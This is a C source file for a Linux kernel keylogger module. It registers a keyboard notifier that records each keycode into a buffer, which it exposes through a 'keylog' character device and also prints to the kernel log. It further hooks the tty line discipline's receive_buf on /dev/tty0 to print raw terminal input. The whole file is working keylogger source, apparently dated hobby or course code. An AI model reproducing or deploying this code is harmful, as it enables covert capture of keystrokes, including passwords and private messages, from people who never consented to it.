#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h> /* printk() */
#include <linux/slab.h> /* kmalloc() */
#include <linux/fs.h> /* everything... */
#include <linux/errno.h> /* error codes */
#include <linux/types.h> /* size_t */
#include <linux/proc_fs.h>
#include <linux/fcntl.h> /* O_ACCMODE */
#include <asm/system.h> /* cli(), *_flags */
#include <asm/uaccess.h> /* copy_from/to_user */

#include <linux/keyboard.h> /* register_keyboard_notifier etc */
#include <linux/tty.h>

#include "keymap.h"

#define print812(...) printk( "<1>812 " ); printk( __VA_ARGS__ ); printk( "\n" );

#define KEYLOG_MAJOR 60
#define KEYLOG_NAME  "keylog"

#define MAX_KEYS_LOGGED 32

MODULE_LICENSE( "Dual BSD/GPL" );

static char *key_buffer;
static int  cur_buf_length = 0;

static void (*old_receive_buf) (struct tty_struct *tty, const unsigned char *cp,
                        char *fp, int count);
struct file *file;
struct tty_struct *tty;


int key_open( struct inode *inode, struct file *filp );
ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos );
int key_release( struct inode *inode, struct file *filp );

struct file_operations fops = {
    read:    key_read,
    open:    key_open,
    release: key_release,
};

int key_open( struct inode *inode, struct file *filp ) {
    print812( "Received an open" );

    return 0;
}

ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
    int err = 0;
    
    print812( "Reading from device" );

    err = copy_to_user( buf, key_buffer, cur_buf_length );
    if ( err < 0 ) {
        print812( "Copying to user failed (%d)", err );
        return err;
    }

    if ( *f_pos == 0 ) {
        *f_pos += cur_buf_length;
        return cur_buf_length;
    } else {
        return 0;
    }
}

struct file* file_open(const char* path, int flags, int rights) {
    struct file* filp = NULL;
    mm_segment_t oldfs;
    int err = 0;
    
    oldfs = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if(IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }

    return filp;
    
}

void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, 
                        char *fp, int count)
{   
    printk("%s", cp);
    //logging(tty, cp, count);    //log inputs

    /* call the original receive_buf */
    (*old_receive_buf)(tty, cp, fp, count);
}

int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    // struct vc_data *vc = param->vc;
    
    if (code == KBD_KEYCODE) {
        cur_buf_length = sprintf( key_buffer, "%s\n", GET_KEYNAME( param->value ) );
        print812( "Keycode %i %s\n", param->value, (param->down ? "down" : "up") );
    }

    return NOTIFY_OK;
}

static struct notifier_block keyboardNotifierBlock = {
        .notifier_call = hello_notify
};

int key_release( struct inode *inode, struct file *filp ) {
    print812( "In release method" );

    return 0;
}

static int hello_init( void ) {
    int err;
    print812( "Initializing the module." );

    err = register_chrdev( KEYLOG_MAJOR, KEYLOG_NAME, &fops );
    if ( err < 0 ) {
        print812( "Registering chrdev failed (%d)", err );
        return err;
    }

    key_buffer = kzalloc( sizeof(char) * MAX_KEYS_LOGGED, GFP_KERNEL );
    if ( !key_buffer ) {
        err = -ENOMEM;
        print812( "Failed to allocate keybuffer (%d)", err );
        
        unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
        return err;
    }

    register_keyboard_notifier(&keyboardNotifierBlock);
    
    file = file_open("/dev/tty0", O_RDONLY, 0);
    if(file != NULL)
    {
        tty = file->private_data;
        
        if((tty != NULL) && (tty->ldisc != NULL) && (tty->ldisc->ops != NULL) &&
            (tty->ldisc->ops->receive_buf != NULL))
        {
            old_receive_buf = tty->ldisc->ops->receive_buf;
            tty->ldisc->ops->receive_buf = new_receive_buf;
        }
    }

    return 0;
}

static void hello_exit( void ) {
    print812( "Unregistering the module" );

    unregister_keyboard_notifier(&keyboardNotifierBlock);

    if(file != NULL)
    {
        filp_close(file, NULL);
    }
    if((tty != NULL) && (tty->ldisc != NULL) && (tty->ldisc->ops != NULL) && 
        (tty->ldisc->ops->receive_buf != NULL) && (old_receive_buf != NULL))
    {
        tty->ldisc->ops->receive_buf = old_receive_buf;
    }

    unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );

    kfree( key_buffer );
}

module_init( hello_init );
module_exit( hello_exit );
